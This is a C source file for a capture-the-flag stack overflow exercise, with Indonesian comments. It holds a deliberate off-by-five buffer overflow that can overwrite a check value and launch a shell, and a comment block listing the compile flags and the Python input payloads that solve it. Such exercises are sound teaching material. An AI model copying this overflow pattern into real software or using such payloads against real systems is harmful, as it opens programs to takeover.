#include <stdlib.h>
#include <stdio.h>

/*
* gcc -m32 -o ch13 ch13.c -fno-stack-protector
* python -c 'print "A"*40' | ./ch13
* python -c 'print "A"*40+"BBBB"' | ./ch13
* python -c 'print "A"*40+"\xde\xad\xbe\xef"' | ./ch13
* python -c 'print "A"*40+"\xef\xbe\xad\xde"' | ./ch13
* (python -c 'print "A"*40+"\xef\xbe\xad\xde"'; cat -) | ./ch13
*/

int main()
{
    int var;
    int check = 0x04030201;
    char buf[40];                        // alokasi 40byte utuk variable 40byte

    fgets(buf,45,stdin);                 // meminta input sebanyak 45 karakter

    printf("\n[buf]: %s\n", buf);
    printf("[check] %p\n", check);

    if ((check != 0x04030201) && (check != 0xdeadbeef))
       printf ("\nYou are on the right way!\n");

    if (check == 0xdeadbeef) {
       printf("Yeah dude! You win!\nOpening your shell...\n");
       system("/bin/dash");
       printf("Shell closed! Bye.\n");
    }
    return 0;
}
